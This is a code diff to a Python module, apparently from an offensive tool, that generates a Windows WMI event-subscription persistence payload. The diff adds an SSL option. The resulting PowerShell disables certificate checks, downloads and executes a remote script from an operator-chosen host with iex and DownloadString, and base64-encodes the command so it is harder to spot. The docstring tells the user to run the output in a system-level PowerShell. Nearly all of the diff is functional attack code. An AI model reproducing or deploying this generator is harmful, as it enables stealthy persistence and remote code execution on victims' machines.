@@ -1,7 +1,7 @@
 #!/usr/bin/python
 import sys
 from support.setting import setting
-
+from base64 import b64encode
 
 
 class create:
@@ -35,7 +35,7 @@ Beacon_Interval:   How often you want the beacon.  Enter a number from the list 
 Once the payload has been generated, either copy and paste the commands into a system level powershell, or download via a powershell download and execute.
 ''' 
     #create a list of possible options
-    option_list=["ip","port","path","filter","consumer","output_file","beacon_interval"]
+    option_list=["ip","port","path","filter","consumer","output_file","beacon_interval","use_ssl"]
    
 
     #initialize variables
@@ -43,7 +43,7 @@ Once the payload has been generated, either copy and paste the commands into a s
     ip=setting("ip","1.1.1.1",True,"beacon ip address")   
     port=setting("port","8080",True,"beacon port")
     path=setting("path","index.html",True,"path to download file on server")
-
+    use_ssl=setting("use_ssl","no",True,"use SSL for callback?")
     filter=setting("filter","",True,"name of WMI filter")   
     consumer=setting("consumer","",True,"name of WMI consumer")
     output_file=setting("output_file","",False,"local output filename")
@@ -62,6 +62,7 @@ Once the payload has been generated, either copy and paste the commands into a s
         output=self.output_file.value
         interval=self.beacon_interval.value
         beacon=self.beacon_settings
+        use_ssl=self.use_ssl.value
         try:
             interval=int(interval)           
         except:
@@ -88,6 +89,17 @@ Once the payload has been generated, either copy and paste the commands into a s
             interval_setting="$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Second=0 OR TargetInstance.Second=15 OR TargetInstance.Second=30 OR TargetInstance.Second=45)\""
 
         address=ip + ":" + port + "/" + path
+        if use_ssl == "no":
+            messageblock="\"powershell -command `\"iex(New-Object Net.WebClient).DownloadString('http://%s')`\"\"" % (address)
+        elif use_ssl == "yes":
+            messageblock = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};iex(New-Object Net.WebClient).DownloadString('https://%s')" % (address)
+            encodedmessage = b64encode(messageblock.encode('UTF-16LE'))
+            messageblock="\"powershell -e %s \"" % (encodedmessage)
+        else:
+            print "use_ssl must be either 'yes' or 'no'"
+            return
+
+        address=ip + ":" + port + "/" + path
         data='''
 $instanceFilter = ([wmiclass]"\\\.\\root\subscription:__EventFilter").CreateInstance()
 $instanceFilter.QueryLanguage = "WQL"
@@ -98,7 +110,7 @@ $result = $instanceFilter.Put()
 $newFilter = $result.Path
 $instanceConsumer = ([wmiclass]"\\\.\\root\subscription:CommandLineEventConsumer").CreateInstance()
 $instanceConsumer.Name = '%s' 
-$instanceConsumer.CommandLineTemplate  = "powershell -command `"iex(New-Object Net.WebClient).DownloadString('http://%s')`""
+$instanceConsumer.CommandLineTemplate  = %s
 $result = $instanceConsumer.Put()
 $newConsumer = $result.Path
 $instanceBinding = ([wmiclass]"\\\.\\root\subscription:__FilterToConsumerBinding").CreateInstance()
@@ -107,7 +119,7 @@ $instanceBinding.Consumer = $newConsumer
 $result = $instanceBinding.Put()
 $newBinding = $result.Path
 
-''' % (interval_setting,filter,consumer,address)
+''' % (interval_setting,filter,consumer,messageblock)
 
         remove_data= '''
 $x="\\\.\\root\subscription:__EventFilter.Name='%s'"
